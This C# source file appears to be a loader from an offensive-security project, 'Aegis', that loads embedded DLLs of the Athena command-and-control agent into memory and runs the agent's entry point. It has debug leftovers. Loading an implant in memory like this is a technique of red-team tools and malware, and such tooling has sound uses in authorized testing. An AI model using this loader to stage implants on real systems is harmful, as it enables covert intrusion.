using Aegis.Models.Interfaces;
using System.Reflection;
using System.Runtime.Loader;

namespace Aegis.Loader
{
    public class AgentLoader : ILoader
    {
        public async Task Go()
        {
            await Load();
        }
        public async Task Load()
        {

            List<string> excludedDlls = new List<string>() {"Agent.dll","Agent.Models.dll" };
            var alc = AssemblyLoadContext.Default;
            var asmExe = Assembly.GetExecutingAssembly();

            if (asmExe == null)
            {
                Console.WriteLine("Null1");
                return;
            }

            //Gotta load this one first since all the others basically rely on it
            Stream modelStream = asmExe.GetManifestResourceStream("Aegis.Loader.Plaintext.Agent.Models.dll");

            if (modelStream == null)
            {
                Console.WriteLine("Null2");
                return;
            }

            alc.LoadFromStream(modelStream);

            //Load the rest of the DLLs except for the agent
            foreach (string aa in asmExe.GetManifestResourceNames())
            {
                if (excludedDlls.Contains(aa))
                {
                    continue;
                }

                Stream s = asmExe.GetManifestResourceStream(aa);
                if (s != null)
                {
                    alc.LoadFromStream(s);
                }
            }
            //Assembly asm = alc.LoadFromAssemblyPath("C:\\Users\\scott\\Downloads\\athena (1)\\Agent.Models.dll");
            //Console.WriteLine(asm.FullName);
            //alc.LoadFromAssemblyPath("C:\\Users\\scott\\Downloads\\athena (1)\\Agent.Crypto.Aes.dll");
            //alc.LoadFromAssemblyPath("C:\\Users\\scott\\Downloads\\athena (1)\\Agent.Managers.Windows.dll");
            //alc.LoadFromAssemblyPath("C:\\Users\\scott\\Downloads\\athena (1)\\Autofac.Extensions.DependencyInjection.dll");
            //alc.LoadFromAssemblyPath("C:\\Users\\scott\\Downloads\\athena (1)\\Microsoft.Extensions.DependencyInjection.Abstractions.dll");
            //alc.LoadFromAssemblyPath("C:\\Users\\scott\\Downloads\\athena (1)\\Agent.Managers.Reflection.dll");
            //alc.LoadFromAssemblyPath("C:\\Users\\scott\\Downloads\\athena (1)\\Agent.Profiles.HTTP.dll");
            //alc.LoadFromAssemblyPath("C:\\Users\\scott\\Downloads\\athena (1)\\Autofac.dll");


            // Load the assembly
            //Assembly assembly = alc.LoadFromAssemblyPath("C:\\Users\\scott\\source\\repos\\MythicAgents\\Athena\\Payload_Type\\athena\\athena\\agent_code\\Agent\\bin\\LocalDebugDiscord\\net7.0\\Agent.dll");
            // Get the entry point method
            Stream ad = asmExe.GetManifestResourceStream("Aegis.Loader.Plaintext.Agent.dll");
            Assembly agent;
            if (ad == null)
            {
                Console.WriteLine("Null4");
                return;
            }
            agent = alc.LoadFromStream(ad);
            MethodInfo entryPoint = agent.EntryPoint;

            // Invoke the entry point method
            object[] parameters = new object[] { new string[0] }; // You can pass command-line arguments
            Console.WriteLine("Executing Agent.");
            entryPoint.Invoke(null, null);
        }
    }
}
